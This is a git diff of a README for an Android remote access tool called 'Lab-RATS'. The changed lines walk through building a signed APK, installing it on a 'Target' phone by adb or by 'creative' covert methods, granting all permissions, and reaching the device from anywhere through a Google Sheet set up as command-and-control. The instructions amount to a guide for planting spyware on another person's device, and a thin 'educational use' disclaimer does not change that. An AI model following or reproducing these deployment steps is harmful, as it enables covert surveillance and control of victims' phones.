@@ -126,18 +126,18 @@ Unlike IPv4—which is **heavily restricted by NAT** and requires complex port f
     *   **Linux/Mac**: `chmod +x build.sh && ./build.sh`
 4.  Select **Option 1** and provide your configuration:
     *   **App Name**: *(Default: LAB-RATS)*
-    *   **Google Sheet URL**: Your Apps Script URL *(Instructions below)*
+    *   **Google Sheet URL**: Enter your **Apps Script URL** *(Setup instructions below)*
 5.  Retrieve your `signed.apk` from the `/Lab-RATS/app-builder/output/` directory.
-6.  Install the generated `signed.apk` onto **Targets Android phone/tablet**.
-7.  Grant **all permissions** the app asks for, then click "Initialize Server".
-8.  The **active web interface IP link** should pop up instantly on your **Google Sheet**. *(example sheet below)*
-9.  **Thats it**! Now you can use **all the remote features from anywhere in the world** as long as the app server is **running on Targets device**.
+6.  Install the `signed.apk` onto the **Target Android phone/tablet** *(Use `adb install signed.apk` if you have access to the device to plug into your PC, otherwise get creative on "how to" install methods)*. 
+7.  Once installed on Target Device, **grant all permissions** the app asks for and then click **"Initialize Server"**.
+8.  The **active web interface IP link** should **pop up instantly** in your **Google Sheet**. *(Example Sheet below)*
+9.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the app server is **running on Target device**.
 
 ---
 
-## 📊 Google Sheet C2 Setup
+## 📊 Google Sheet C2 Setup Instructions
 
-1.  Create a new **Google Sheet**.
+1.  **Create** a new **Google Sheet**.
 2.  Go to **Extensions** → **Apps Script**.
 3.  **Replace** the **default code** with this **snippet**:
 
@@ -187,7 +187,7 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 ---
 
 ## ⚠️ Disclaimer
-**This tool is strictly for educational and authorized security testing purposes.** The developers assume **NO responsibility** for any misuse or damage caused by this software. **Please use it responsibly**.
+**This tool is strictly for educational and authorized security testing purposes.** **The developers** assume **NO responsibility** for any misuse of this software. **Please use it responsibly**. **Enjoy!**
 
 ---
 
